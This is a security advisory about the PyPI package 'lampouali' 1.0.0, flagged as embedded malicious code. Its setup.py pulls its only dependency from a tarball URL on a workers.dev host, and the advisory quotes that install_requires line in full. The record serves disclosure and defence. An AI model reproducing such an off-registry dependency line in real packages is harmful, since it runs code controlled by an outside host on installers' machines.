summary: setup.py resolves its sole dependency from an attacker-controlled workers.dev URL
details: lampouali 1.0.0's setup.py declares install_requires=["ticket-token-daemon-helper @ https://package-registry-receiver-stg.depx-research-bf0.workers.dev/pypi/ticket_token_daemon_helper-1.0.0.tar.gz"], pointing its only dependency at a direct tarball URL on a Cloudflare workers.dev subdomain instead of a PyPI version range. On a default `pip install lampouali`, pip fetches whatever bytes are served from that URL and runs the retrieved package's setup.py/build hooks on the installer's machine, with no version pin and no integrity check. Whoever controls the workers.dev host controls code executed at install time on every installer. The shipped lampouali module itself is a 37-byte stub, so the off-registry dependency URL is the package's entire install-time effect.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
